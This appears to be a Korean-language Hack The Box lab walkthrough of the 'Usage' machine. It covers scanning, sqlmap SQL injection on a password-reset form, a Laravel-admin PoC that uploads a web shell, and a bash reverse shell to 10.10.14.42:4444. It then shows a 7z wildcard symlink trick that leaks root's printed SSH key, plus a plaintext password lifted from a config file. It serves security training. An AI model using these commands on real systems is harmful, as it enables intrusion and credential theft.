## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Usage]
└─$ nnmap 10.129.9.222 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 12:58 +0900
Nmap scan report for 10.129.9.222
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   230.03 ms 10.10.14.1
2   230.34 ms 10.129.9.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.97 seconds
                                                                 
```

서브도메인 퍼징 - TCP 80
```bash
┌──(kali㉿kali)-[~/HTB/Usage]
└─$ ffuf -u http://10.129.9.222 -H "Host: FUZZ.usage.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /''___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.9.222
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.usage.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 982ms]
:: Progress: [19966/19966] :: Job [1/1] :: 174 req/sec :: Duration: [0:02:00] :: Errors: 0 ::


```


usage.htb 접근 후 /forget-password 에서 email 파라미터에 sql injection 발견

sqlmap 사용하여 DB목록 추출
`information_schema`
`performance_schema`
`usage_blog`

```bash
┌──(kali㉿kali)-[~/HTB/Usage]
└─$ sudo sqlmap -r request.txt -p email --level=3 --dbs --batch --technique=B --threads=10
        ___
       __H__                                                                                                        
 ___ ___[(]_____ ___ ___  {1.9.10#stable}                                                                           
|_ -| . [,]     | .'| . |                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:50:34 /2026-03-16/

[14:50:34] [INFO] parsing HTTP request from 'request.txt'
[14:50:34] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[14:50:36] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[14:50:37] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[14:50:38] [INFO] testing for SQL injection on POST parameter 'email'
[14:50:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:51:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:51:27] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable                                                                                               
[14:51:35] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] Y
[14:51:35] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=GgLa8leTpjVqRh60ytoaXbI0retL0YHU6JMgBFL4&email=qq@a.com' AND 1185=(SELECT (CASE WHEN (1185=1185) THEN 1185 ELSE (SELECT 7582 UNION SELECT 7905) END))-- EMwQ
---
[14:51:45] [INFO] testing MySQL
[14:51:46] [INFO] confirming MySQL
[14:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[14:51:51] [INFO] fetching database names
[14:51:51] [INFO] fetching number of databases
[14:51:51] [INFO] retrieved: 3
[14:51:55] [INFO] retrieving the length of query output
[14:51:55] [INFO] retrieved: 18
[14:52:23] [INFO] retrieved: information_schema             
[14:52:23] [INFO] retrieving the length of query output
[14:52:23] [INFO] retrieved: 18
[14:52:49] [INFO] retrieved: performance_schema             
[14:52:49] [INFO] retrieving the length of query output
[14:52:49] [INFO] retrieved: 10
[14:53:09] [INFO] retrieved: usage_blog             
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[14:53:09] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 217 times
[14:53:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'

[*] ending @ 14:53:09 /2026-03-16/



```


usage_blog 데이터베이스 내 테이블 목록 추출

admin_users 테이블 덤프하여 관리자 비밀번호 해시 획득


관리자패널에서 Laravel 서비스 버전 확인
Larevel 10.18.0

해당 버전 POC 다운로드

[https://github.com/advisories/GHSA-g857-47pm-3r32](https://github.com/advisories/GHSA-g857-47pm-3r32)
[https://github.com/ldb33/CVE-2023-24249-PoC.git](https://github.com/ldb33/CVE-2023-24249-PoC.git)

```bash
┌──(kali㉿kali)-[~/HTB/Usage]
└─$ git clone https://github.com/ldb33/CVE-2023-24249-PoC.git
Cloning into 'CVE-2023-24249-PoC'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (4/4), done.

```

POC를 실행하여 웹쉘 업로드 성공
```bash
┌──(kali㉿kali)-[~/Usage/CVE-2023-24249-PoC]└─$ python CVE-2023-24249.py
[+] Web shell uploaded to http://admin.usage.htb/uploads/images/shell.php
```


웹쉘 이용하여 리버스쉘 연결 명령 실행
```bash
curl http://admin.usage.htb/uploads/images/shell.php --data-urlencode 'c=bash -c "sh -i >& /dev/tcp/10.10.14.42/4444 0>&1"'
```

리버스쉘 연결 성공

```bash
┌──(kali㉿kali)-[~/HTB/Usage]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.9.222] 41202
sh: 0: can't access tty; job control turned off
$ whoami
dash

```

user.txt 획득
![[Pasted image 20260316132049.png]]

dash 사용자 홈 디렉토리 확인

```bash
$ ls -al
total 52
drwxr-x--- 6 dash dash 4096 Mar 16 04:20 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Mar 16 04:20 .monit.pid
-rw------- 1 dash dash 1192 Mar 16 04:20 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Mar 16 01:35 user.txt

```

.monitrc 파일에서 비밀번호 발견 `3nc0d3d_pa$$w0rd`

```bash
$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert

```

쉘 접근 권한 가진 사용자 확인 `xander`
```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dash:x:1000:1000:dash:/home/dash:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xander:x:1001:1001::/home/xander:/bin/bash
clamav:x:115:121::/var/lib/clamav:/bin/false
_laurel:x:998:997::/var/log/laurel:/bin/false

```

이전에 획득한 비밀번호를 이용해 xander 사용자로 접속

```bash

┌──(kali㉿kali)-[~/HTB/Usage]
└─$ ssh xander@10.129.9.222                                                                                     
The authenticity of host '10.129.9.222 (10.129.9.222)' can't be established.
ED25519 key fingerprint is: SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.9.222' (ED25519) to the list of known hosts.
xander@10.129.9.222's password: 3nc0d3d_pa$$w0rd
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)


```

sudo 권한 확인

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

```
`usage_management` 파일 확인 시 /var/www/html 디렉토리 내 모든 파일 압축하는 것으로 추정


```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

```

7z wildcard 취약점을 이용하여 root의 OPENSSH PRIVATE KEY 획득

```bash
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17946 files, 113879109 bytes (109 MiB)

Creating archive: /var/backups/project.zip

Items to compress: 20930

                                                                               
Files read from disk: 17946
Archive size: 54829699 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7

```

 획득한 openssh private key를 이용하여 ssh 접속
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Usage]
└─$ cat id_rsa           
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----

┌──(kali㉿kali)-[~/HTB/Usage]
└─$ ssh root@10.129.9.222 -i id_rsa
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)


 ```

root.txt 획득
![[Pasted image 20260316133625.png]]